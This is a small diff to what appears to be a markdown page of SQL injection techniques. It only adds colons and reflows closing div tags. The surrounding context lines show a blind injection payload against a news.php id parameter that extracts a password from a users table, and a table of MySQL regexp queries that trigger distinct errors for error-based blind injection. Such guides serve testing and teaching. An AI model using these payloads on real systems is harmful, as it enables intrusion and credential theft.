@@ -602,7 +602,7 @@ from dual);</pre>
     news.php?id=`FIND_IN_SET (substring ((select password from users limit 0,1), 1, 1), '0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f')`
 
 <div class="spoiler"><div class="spoiler-title">
-    <i>Error-based blind sql-injection. (11 + 1 error types)</i>
+    <i>Error-based blind sql-injection. (11 + 1 error types):</i>
 </div><div class="spoiler-text" markdown="1">
 
 >  <br>This query returns 11 different types of errors or no error depending on the first letter from pass.
@@ -632,7 +632,7 @@ from dual);</pre>
     '}[[.ch.]]')),
     '}\\'))) -- 1
 > <div class="spoiler"><div class="spoiler-title">
-> 11 + 1 types of mysql errors
+> 11 + 1 types of mysql errors:
 > </div><div class="spoiler-text" markdown="1">
 >
 > > <br>
@@ -650,7 +650,8 @@ from dual);</pre>
 | 10 | `select 1 regexp if(1=1,'[[.ch.]]',2);`       | #1139 - Got error 'invalid collating element' from regexp           |
 | 11 | `select 1 regexp if(1=1,'\\',2);`             | #1139 - Got error 'trailing backslash (\)' from regexp              |
 > </div></div>
-</div></div>
+</div>
+</div>
 
 <!-- ============================================================================================================================================ -->
 <!-- ============================================================================================================================================ -->
